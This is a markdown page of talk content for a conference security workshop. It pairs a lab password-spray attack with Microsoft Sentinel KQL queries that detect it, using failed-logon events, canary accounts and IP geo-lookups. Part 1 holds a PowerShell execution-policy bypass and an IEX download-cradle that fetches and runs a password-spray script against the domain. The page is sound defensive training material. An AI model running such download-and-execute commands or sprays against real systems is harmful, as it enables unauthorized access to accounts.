# Nebraska Cyber Security Conference 2024 - Talk Slides & Content

## Attack Detect Defend - Jordan Drysdale & Kent Ickler

This-two part talk is a condensed sample from a 16hr training course Jordan and Kent teach, offered by AntiSyphonTraining.com.

In the two sessions we will give an overview into what we call threat optics: auditing endpoints, centralizing logs and visualizing results.

Each student will leave the class having experienced a penetration test through three distinct perspectives, each building on the previous. These will include adversarial attacks, examination of defensive postures, and wrapped up with various detection methodologies using open-source or free industry threat detection and defenses.




![Attack Detect Defend](Z-images/logo/add.png)
![DIV1]


# Course Pre-requisites
This talk discusses 
- GitHub Account 
- Azure Account 
- DOAZLab.com Azure Deployment
- Detailed Instructions: [ADD-Pre-Reqs](https://github.com/DefensiveOrigins/ADD-PreReqs/blob/main/README.md) 

# Course Information 
&#x1F6C8;  [H0001 - Course Information][H0001]  
&#x1F6C8;  [H0004 - Course Instructors][H0004]  




# Conference Talk Content    

## Attack Detect Defend - Part 1 (~09/17/24 9:00 AM)

### Slides
- [NECSC24 Attack Detect Defend Part 1][necsc241]

### Password Spray

Launch a PowerShell session with no script validation checks. This will be our first run of the attack. 

``` powershell
powershell -ep bypass
```

Bring over the module to use for the attack.

``` powershell
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -Password "Summer2024!" -Force
```



### Password Spray

Launch a PowerShell session with no script validation checks. This will be our second iteration of the attack. 

``` powershell
powershell -ep bypass
```

Bring over the module to use for the attack. Re-run the attack. 

``` powershell
IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -Password "Summer2024!" -Force
```

The next query uses some underlying accounts, preconfigured for easy detections. Boom - failed logins on known accounts? Guess what, easy detect.

```
SecurityEvent
| where EventID == 4625
// remember the deception account naming conventions? 
| where Account contains "DOLabs"
| project TimeGenerated , Activity , Account
```

Luis and Heloise are both canary accounts we know and maintain. Let's check on them.

```
SecurityEvent
| where EventID == 4624 or EventID == 4625 or EventID == 4776
| where Account contains "Heloise" or Account contains "luis"
| project Activity, Account, Computer, IpAddress
```

Ever seen a password spray in real time logs? 

```
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(24h)
| summarize Count=count() by bin(TimeGenerated, 1m)
| render timechart
```

Let's look at some source IP addresses.

```
SecurityEvent
| where EventID == 4625 or EventID == 4776
| summarize count() by IpAddress
```

## Attack Detect Defend - Part 2 (~09/17/24 10:00 AM)

### Slides
- [NECSC24 Attack Detect Defend Part 2][necsc242]

### Some additional commands, listed below, can help with attribution. Though, what can we actually do with this info? 

Geo-lookup!!!

```kusto
let ipdata = externaldata(network:string,geoname_id:string,continent_code:string,continent_name:string,country_iso_code:string,country_name:string,is_anonymous_proxy:string,is_satellite_provider:string)
[@"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv"];
let IPs = union Event, SecurityEvent
| where EventID in ("4624","4625")
    and AccountType != "Machine"
    and IpAddress != "-" 
| project IpAddress, TimeGenerated, Activity, EventID;
IPs
| evaluate ipv4_lookup(ipdata, IpAddress, network)
| summarize Count = count() by IpAddress, network, country_iso_code, country_name
| order by Count 
```

Let's check some outbound connections...

```kusto
let ipdata = externaldata (network:string,geoname_id:string,continent_code:string,continent_name:string,country_iso_code:string,country_name:string,is_anonymous_proxy:string,is_satellite_provider:string)
[@"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv"];
let IPs = SysmonParser
| where EventID == 3
| where dst_ip != '168.63.129.16'
| summarize by UserName, Computer, tostring(process_path), tostring(src_ip), tostring(src_port), tostring(dst_ip), tostring(dst_port),  tostring(network_protocol), TimeGenerated;
IPs
| evaluate ipv4_lookup(ipdata, dst_ip, network)
| summarize Count = count() by Computer, dst_ip, process_path, country_name
| sort by Count
```

How about a quick peek at the usernames landing in our logs?

```kusto
SecurityEvent
| where EventID == 4625
| summarize count() by TargetAccount
| order by count_
```

Let's take a look at arrays associated with the users guessed by specific source IP addresses.

```kusto
union Event, SecurityEvent
| where TimeGenerated < ago(30m)
| where EventID == 4625 or EventID == 4776
| project Account , IpAddress
| summarize USERs = make_set(Account) by IpAddress
| where USERs[1] != ""
```

This is a failed login perspective based on a timechart. We may have already seen this :D.

```kusto
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(4h)
| summarize Count=count() by bin(TimeGenerated, 1m)
| render timechart
```

One last look! Here, we have an SSH server exposed to the Internet. At the time of this gig, Thailand was getting after it! 

```kusto
let ipdata = externaldata(network:string,geoname_id:string,continent_code:string,continent_name:string,country_iso_code:string,country_name:string,is_anonymous_proxy:string,is_satellite_provider:string)
[@"https://raw.githubusercontent.com/datasets/geoip2-ipv4/master/data/geoip2-ipv4.csv"];
let IPs = Syslog
| where SyslogMessage startswith "Failed Password"
| order by EventTime desc 
| extend User = extract("for(?s)(.*)from",1,SyslogMessage)
| extend IPaddr = extract("(([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.(([0-9]{1,3})))",1,SyslogMessage) 
| project HostName, SyslogMessage, EventTime, IPaddr, User;
IPs
| evaluate ipv4_lookup(ipdata, IPaddr, network)
| summarize Count = count() by IPaddr, network, country_iso_code, country_name
| order by Count 
```

[Event IDs Cheatsheet][evids2]

Copyright - All Rights Reserved, Defensive Origins LLC
<!-- DO-MD-FOOTER-END -->

<!-- DO-MD-SHORTCUTS-START -->
[Home]: ./README.md
[evidref]: 9-Others/Cheatsheets/EventIDs.md
[addlogo]:Z-images/logo/add.png
[addlogosm]:Z-images/logo/addsm.png
[addlogo]:../../Z-images/logo/add.png
[addlogosm]:../../Z-images/logo/addsm.png
[WWHF]: https://wildwesthackinfest.com/
[XXXX]: https://www.google.com
[ph_jd]: Z-images/photo/jd1.png
[ph_ki]: Z-images/photo/ki1.png
[H0004]: /9-Others/H0040-Instructors/README.md
[H0001]: /9-Others/H0001/README.md
[DOImage]: Z-images/do_darkbackground.jpg
[DOImage]:Z-images/do_darkbackground.jpg
[DefOrg]: https://defensiveorigins.com/
[Div1]: Z-images/div/div1.png
[Div2]: Z-images/div/div2.png
[DO]: https://www.defensiveorigins.com
[DO1]: Z-images/logo/DO1.png
[DO1sm]: Z-images/logo/DO1sm.png
[DOAboutUs]: https://defensiveorigins.com/about-us
[DOAZLab]: https://www.doazlab.com
[DOAZLab-Github]: https://github.com/DefensiveOrigins/DO-LAB
[1]: https://defensiveorigins.com/
[2]: https://wildwesthackinfest.com/training/
[APT]:https://github.com/DefensiveOrigins/AtomicPurpleTeam
[necsc241]:https://github.com/DefensiveOrigins/NECSC24/blob/main/9-Others/Attack-Detect-Defend-NECSC-part1%20(1).pdf
[necsc242]:https://github.com/DefensiveOrigins/NECSC24/blob/main/9-Others/Attack-Detect-Defend-NECSC-part1%20(2).pdf
[evids2]:https://github.com/DefensiveOrigins/NECSC24/blob/main/9-Others/Cheatsheets/EventIDs.md
